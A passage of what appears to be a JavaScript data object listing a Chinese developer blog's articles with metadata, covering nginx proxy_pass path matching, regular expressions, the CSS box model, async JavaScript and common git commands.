http://localhost:5001/aaa/yyy/;\n    }\n}\n```\n\n浏览器地址栏：http://localhost:5002/xxx或http://localhost:5002/xxx123，匹配到nginx中5002端口的/xxx（因为/xxx是/xxx的前缀，不是/xxx/的前缀，因为少了一个/），然后匹配到的该路径又代理到了proxy_pass http://localhost:5001/，且带了/，即绝对路径，最终就是代理到http://localhost:5001/\n\n浏览器地址栏：http://localhost:5002/xxx/或http://localhost:5002/xxx/123，匹配到nginx中5002端口的/xxx/（因为/xxx和/xxx/都是/xxx的前缀，但取最长的/xxx/），然后匹配到的该路径又代理到了proxy_pass http://localhost:5001/，且带了/，即绝对路径，最终就是代理到http://localhost:5001/\n\n浏览器地址栏：http://localhost:5002/yyy或http://localhost:5002/yyy123或http://localhost:5002/yyy/123，匹配到nginx中5002端口的/yyy，然后匹配到的该路径又代理到了proxy_pass http://localhost:5001/aaa/，且带了/，即绝对路径，最终就是代理到http://localhost:5001/aaa/\n\n浏览器地址栏：http://localhost:5002/aaa或http://localhost:5002/aaa123或http://localhost:5002/aaa/123，匹配到nginx中5002端口的/aaa，然后匹配到的该路径又代理到了5001端口，且带了/，即绝对路径，最终就是代理到http://localhost:5001/aaa/yyy/\n\n## 小结\n\n> 实际应用时，localtion最后最好加/\n>\n> ```nginx\n> server {\n>  listen       5001;\n>  server_name  localhost;\n>  location /api/ {\n>      proxy_pass http://localhost:5002/;\n>  }\n> }\n> ```\n>\n> http://localhost:5001/api/ ===> http://localhost:5002\n>\n> localtion加/的好处是，只有/api/才可以匹配，如果不加/，就只是/api，那样/api123，/api456等等都可匹配到/api，有很多可能性都可以匹配到/api，因此最好就加/，那样只有/api/123，/api/456/等等可以匹配到/api/。\n>\n> 而下面的proxy_pass，最好只是URL，不要带URI，而最后加不加/就看需求，比如我希望http://localhost:5001直接代理到http://localhost:5002，那么设置location /，proxy_pass是http://localhost:5002/，这样http://localhost:5001就会直接匹配到http://localhost:5002\n>\n> 那么，假设我服务器的3000端口被nuxt项目占了，而我这个nuxt项目里又要用到3003端口的数据，那么我nuxt项目（3000端口）要如何获取到3003端口的数据呢，这里就可以在nginx的3000端口添加一条路径，localtion为/，proxy_pass http://localhost:3003/，这样就会将http://localhost:3000代理到http://localhost:3003\n>\n> 但是，因为我的nuxt项目是在443端口的，443端口的localtion /就是代理到我的nuxt项目3000端口，那么这时候就不能使用/来代理到3003了，因此可以换成localtion /api/，proxy_pass不变，这样443端口匹配到/api/就会代理到http://localhost:3003，在nuxt项目里设置请求的前缀都是/api/即可\n\n```nginx\nlocation /chat/ {\n    proxy_pass http://localhost:5001/;\n}\n# http://localhost/chat/  ===> http://localhost:5001/\n```\n\n```nginx\nlocation /chat/ {\n    proxy_pass http://localhost:5001/webchat/;\n}\n# http://localhost/chat/  ===> http://localhost:5001/webchat/\n```\n\n# 参考\n\nhttps://blog.csdn.net/agonie201218/article/details/92795522\n\nhttps://juejin.cn/post/6844903796791836685#heading-3\n\nhttps://blog.csdn.net/qq_33862644/article/details/79337348\n\nhttps://blog.csdn.net/xiaoxiangzi520/article/details/78737527\n\nhttps://blog.csdn.net/zwl18210851801/article/details/81699977',
      click: 65,
      createdAt: '2020-02-24T07:48:58.000Z',
      updatedAt: '2021-03-21T05:45:12.000Z',
      types: [
        {
          id: 2,
          name: '后端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 8,
            article_id: 8,
            type_id: 2,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 8,
            user_id: 1,
            article_id: 8,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 7,
          name: 'nginx',
          color: 'rgba(67, 109, 130, 1)',
          createdAt: '2020-07-04T15:21:23.000Z',
          updatedAt: '2020-07-04T15:21:23.000Z',
        },
      ],
    },
    {
      id: 6,
      title: '正则表达式',
      is_comment: 1,
      status: 1,
      img: '/1582634581438regexr.jpg',
      content:
        "# RegExp对象\n\n### test()\n\ntest()方法搜索字符串指定的值，根据结果并返回真或假。\n\n```js\n// test()\nlet str1 = 'aaaaaa'\nlet str2 = 'AAAAAA'\nlet str3 = 'aaaAAA'\nlet str4 = 'aaa111'\nlet str5 = 'AAA111'\nlet str6 = 'aaaAAA1'\nlet reg = /(?!^[a-zA-Z]{1,}$)(?!^[a-z0-9]{1,}$)(?!^[A-Z0-9]{1,}$)^[a-zA-Z0-9]{6,16}$/\nconsole.log(reg.test(str1));    //false\nconsole.log(reg.test(str2));    //false\nconsole.log(reg.test(str3));    //false\nconsole.log(reg.test(str4));    //false\nconsole.log(reg.test(str5));    //false\nconsole.log(reg.test(str6));    //true\n```\n\n### exec()\n\nexec() 方法检索字符串中的指定值。返回值是被找到的值。如果没有发现匹配，则返回 null。\n\n```js\n// exec()\nlet str7 = 'aaaAAA1'\nlet str8 = 'aaaaaa'\nlet str9 = 'aaaAAA2'\nlet str10 = 'aaaAAA2345'\nlet reg1 = /[0-9]/\nconsole.log(reg1.exec(str7));   //[\"1\", index: 6, input: \"aaaAAA1\", groups: undefined]\nconsole.log(reg1.exec(str8));   //null\nconsole.log(reg1.exec(str9));   //[\"2\", index: 6, input: \"aaaAAA2\", groups: undefined]\nconsole.log(reg1.exec(str10));  //[\"2\", index: 6, input: \"aaaAAA2345\", groups: undefined]\n```\n\n\n\n### 正则表达式\n\n```\n\\w\t\t匹配数字，大小写字母和下划线\n\\W\t\t匹配除了数字，大小写字母和下划线以外的字符\n\\d\t\t匹配数字\n\\D\t\t匹配不是数字的，包括空格\n\\s\t\t匹配空白字符（如：空格，制表符，断行）\n\\S\t\t匹配除了空白字符以外的字符\n[abc]\t\t匹配集合里面的a,b,c\n[a-z]\t\t匹配集合里面的a至z\n[A-Z]\t\t匹配集合里面的A至Z\n[a-d]\t\t匹配集合里面的a-d，即a,b,c,d\n[A-D]\t\t匹配集合里面的A-D，A,B,C,D\n[0-9]\t\t匹配集合里面的0-9，0,1,2,3,4,5,6,7,8,9\n[1-4]\t\t匹配集合里面的1-4，0,1,2,3,4\n[一-龥]\t匹配所有中文字符\n.\t\t匹配除换行符以外的任意字符\n\n```\n\n```\n+\t\t重复一次或多次\n[yY][oO]+\t\t\t可以匹配：yo,yoooo,Yo,Yooo,YOOOOO,yOoO\n*\t\t重复零次或多次\n[yY][oO]+[!~\\.]*\t\t可以匹配yo,yoooo,Yo,Yooo,YOOOOO,,yOoO,yo!,yo.,yooo~,yooo~,yo~!\n?\t\t零次或一次\n[yY][oO]+p?\t\t\t可以匹配yo,yoooo,Yo,Yooo,YOOOOO,yOoO,yop,yoooop\n{2,4}\t\t指定重复2到4次\nyo{2,4}\t\t\t\t可以匹配yoo,yooo,yoooo\n{3}\t\t指定重复3次\nyo{3}\t\t\t\t可以匹配yooo\n{2,}\t\t指定至少2次\nyo{2,}\t\t\t\t可以匹配yoo,yoooo,yoooooo,yoooooo\n{0,1}\t\t重复零次或一次，相当于?\n{0,}\t\t重复零次或多次，相当于*\n{1,}\t\t重复一次或多次，相当于+\n```\n\n位置限定符\n\n```\n^\t\t匹配行首的位置\n```\n```\n$\t\t匹配行尾的位置\n```\n```\n/b\t\t匹配一个单词边界，即字与空格间的位置\n```\n```\n\\B\t\t匹配非单词边界\n```\n",
      click: 11,
      createdAt: '2020-02-24T07:48:58.000Z',
      updatedAt: '2020-12-31T16:20:06.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 6,
            article_id: 6,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 6,
            user_id: 1,
            article_id: 6,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [],
    },
    {
      id: 7,
      title: 'css盒子模型',
      is_comment: 1,
      status: 1,
      img: '/1582636060576cssbox.jpg',
      content:
        '# box-sizing\n1. content-box\n\t > 默认值，标准盒子模型。 width 与 height 只包括内容的宽和高， 不包括边框（border），内边距（padding），外边距（margin）\n\n\t> 尺寸计算公式：width = 内容的宽度，height = 内容的高度。宽度和高度都不包含内容的边框（border）和内边距（padding）\n2. border-box\n\t > width 和 height 属性包括内容，内边距和边框，但不包括外边距\n\n\t > 尺寸计算公式：width = border + padding + 内容的  width',
      click: 3,
      createdAt: '2020-02-24T07:48:58.000Z',
      updatedAt: '2021-02-16T13:05:50.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 7,
            article_id: 7,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 7,
            user_id: 1,
            article_id: 7,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 4,
          name: 'css',
          color: 'rgba(144, 238, 144, 1)',
          createdAt: '2020-07-04T15:17:06.000Z',
          updatedAt: '2020-07-04T15:17:06.000Z',
        },
      ],
    },
    {
      id: 9,
      title: 'Js异步编程',
      is_comment: 1,
      status: 1,
      img: null,
      content:
        "# 回调函数\n```language\nfunction say(callback) {\n    setTimeout(() => {\n        console.log('11111')\n        callback()\n    }, 1000)\n}\nsay(() => {\n    console.log('2222')\n})\n```\n# Promise\n```language\nnew Promise(function (resolve, reject) {\n    setTimeout(() => {\n        console.log('11111')\n        resolve()\n    }, 1000)\n}).then(() => {\n    console.log('2222')\n})\n```\n# async/await\n```language\nasync function f1() {\n    var res = await new Promise(function (resolve, reject) {\n        setTimeout(() => {\n            console.log('11111')\n            resolve('2222')\n        }, 1000)\n    })\n    console.log(res)\n}\nf1()\n```\n\n\n",
      click: 6,
      createdAt: '2020-02-24T07:48:58.000Z',
      updatedAt: '2021-02-16T13:22:33.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 9,
            article_id: 9,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 9,
            user_id: 1,
            article_id: 9,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 16,
          name: 'Promise',
          color: 'rgba(154, 32, 206, 0.5)',
          createdAt: '2020-07-21T07:32:42.000Z',
          updatedAt: '2020-07-21T07:32:42.000Z',
        },
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 10,
      title: 'git常用命令',
      is_comment: 1,
      status: 1,
      img: '/1582472959525git.png',
      content:
        "# 分支操作\n\n- 新建分支\n\n  > git branch 新分支名\n  >\n  > 如果当前是在master分支，执行git branch 新分支名，就是在master分支下新建分支；如果当前是在dev分支，执行git branch 新分支名，就是在dev分支下新建分支\n\n- 切换分支\n\n  > git checkout 分支名\n\n- 重命名分支\n\n  > git branch -m 旧分支名 新分支名\n\n- 删除分支\n\n  > git branch -d 分支名\n  >\n  > 删除远程分支: git push origin --delete [branchname]\n\n- 查看远程分支\n\n  > git branch -a\n\n- 查看所有远程分支\n\n  > git branch -r\n\n- 创建并切换分支\n\n  > git checkout -b 新分支名\n\n- 创建并切换远程分支\n\n  > git checkout -b 新分支名 远程分支名\n  >\n  > 如git checkout -b dev origin/develop\n\n- 查看每一个分支的最后一次提交\n\n  > git branch -v\n\n- 查看本地分支和远程分支的跟踪关系\n\n  > git branch -vv\n\n- 查看点线图\n\n  > git log --graph\n\n## 跟踪远程分支\n\n克隆时自动将创建好的`master`分支追踪`origin/master`分支\n\n```bash\ngit clone 服务器地址\n```\n\n在远程分支的基础上建立`develop`分支，并且让`develop`分支追踪`origin/develop`远程分支。\n\n> 如果想新建一个本地分支不同名字，同时跟踪一个远程分支可以利用：\n> git checkout -b  new_branch_name  branch_name\n> 这条指令本来是根据一个 branch_name 分支分出一个本地分支 new_branch_name，但是如果所根据的分支 branch_name 是一个远程分支名，那么本地的分支会自动的 track 远程分支。建议跟踪分支和被跟踪远程分支同名\n\n```bash\ngit checkout -b develop origin/develop\n```\n\n在本地创建一个与 `dev-hss`同名分支跟踪远程分支。\n\n```bash\ngit checkout --track origin/dev-hss\n```\n\n# 配置\n\n显示当前的Git配置\n\n```bash\ngit config --list\n```\n\n查看当前用户（global）配置\n\n```bash\ngit config --global --list\n```\n\n查看当前仓库配置信息\n\n```bash\ngit config --local --list\n```\n\n设置邮箱\n\n```bash\ngit config --global user.email '2274751790@qq.com'\n```\n\n设置用户名\n\n```bash\ngit config --global user.name 'galaxy-s10'\n```\n\n# 参考\n\nhttp://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html",
      click: 95,
      createdAt: '2020-02-21T09:50:14.000Z',
      updatedAt: '2021-06-15T00:48:01.000Z',
      types: [
        {
          id: 3,
          name: '随记',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 10,
            article_id: 10,
            type_id: 3,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 10,
            user_id: 1,
            article_id: 10,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 8,
          name: 'git',
          color: 'rgba(245, 77, 39, 1)',
          createdAt: '2020-07-04T15:22:29.000Z',
          updatedAt: '2020-07-04T15:22:29.000Z',
        },
      ],
    },
  ],
  message: '获取文章列表成功!',
};
